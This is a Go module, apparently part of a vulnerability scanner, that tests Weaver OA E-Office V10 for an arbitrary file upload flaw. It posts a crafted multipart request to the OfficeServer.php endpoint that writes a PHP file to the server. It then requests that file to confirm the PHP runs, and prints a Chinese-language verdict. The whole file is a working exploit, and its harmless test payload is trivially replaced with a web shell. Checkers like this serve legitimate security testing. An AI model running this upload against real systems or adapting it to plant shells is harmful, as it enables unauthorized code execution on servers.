package ecology_officeServe_uploadfile

import (
	"github.com/gookit/color"
	"github.com/imroc/req/v3"
	"strings"
	"time"
)

var (
	client = req.C().EnableForceHTTP1().SetTimeout(5 * time.Second)
	UA     = "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:95.0) Gecko/20100101 Firefox/95.0"
)

func checkVulnerability(url string) bool {
	uploadUrl := url + "/eoffice10/server/public/iWebOffice2015/OfficeServer.php"
	checkUrl := url + "/eoffice10/server/public/iWebOffice2015/Document/test123.php"

	// 构建手动的请求体
	body := "--WebKitFormBoundaryJjb5ZAJOOXO7fwjs\r\n"
	body += "Content-Disposition: form-data; name=\"FileData\"; filename=\"test123.php\"\r\n"
	body += "Content-Type: application/octet-stream\r\n\r\n"
	body += "<?php echo 'test';?>\r\n"
	body += "--WebKitFormBoundaryJjb5ZAJOOXO7fwjs\r\n"
	body += "Content-Disposition: form-data; name=\"FormData\"\r\n"
	body += "{{'USERNAME':'admin','RECORDID':'undefined','OPTION':'SAVEFILE','FILENAME':'test123.php'}\r\n"
	body += "--WebKitFormBoundaryJjb5ZAJOOXO7fwjs--\r\n"

	// 发送POST请求
	resp, err := client.R().
		SetHeaders(map[string]string{
			"User-Agent":      UA,
			"Content-Type":    "multipart/form-data; boundary=----WebKitFormBoundaryJjb5ZAJOOXO7fwjs",
			"Content-Length":  "393",
			"Accept-Encoding": "gzip, deflate",
			"Connection":      "close",
		}).
		SetBodyString(body).
		Post(uploadUrl)
	if err != nil || resp.StatusCode != 200 {
		return false
	}

	// 发送GET请求检查文件是否存在
	testResp, testErr := client.R().
		SetHeaders(map[string]string{
			"User-Agent": UA,
		}).Get(checkUrl)

	if testErr == nil && testResp.StatusCode == 200 && strings.Contains(testResp.String(), "test") {
		return true
	}

	return false
}

func Run(url string) {
	if checkVulnerability(url) {
		// 构建检查URL
		checkUrl := url + "/eoffice10/server/public/iWebOffice2015/Document/test123.php"
		color.Green.Println("[+12] 泛微OA E-Office V10 OfficeServer 任意文件上传漏洞存在 -> ", checkUrl)
	} else {
		color.Red.Println("[-12] 泛微OA E-Office V10 OfficeServer 任意文件上传漏洞不存在")
	}
}
